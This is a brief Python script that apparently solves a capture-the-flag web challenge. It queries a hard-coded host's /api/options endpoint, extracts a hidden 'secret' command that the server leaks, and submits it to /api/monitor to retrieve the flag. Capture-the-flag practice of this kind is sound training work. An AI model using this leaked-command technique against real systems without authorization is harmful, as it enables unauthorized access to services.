import requests
import json

HOST = '94.237.59.199'
PORT = 32475 
URL = f'http://{HOST}:{PORT}'

# Grab the secret command
resp = requests.get(f'{URL}/api/options')
options = json.loads(resp.text)
secret_cmd = options['allPossibleCommands']['secret'][0]

# Pass in the secret command to get the flag
resp = requests.post(f'{URL}/api/monitor', json={'command': secret_cmd})
flag = json.loads(resp.text)['message']
print(flag)
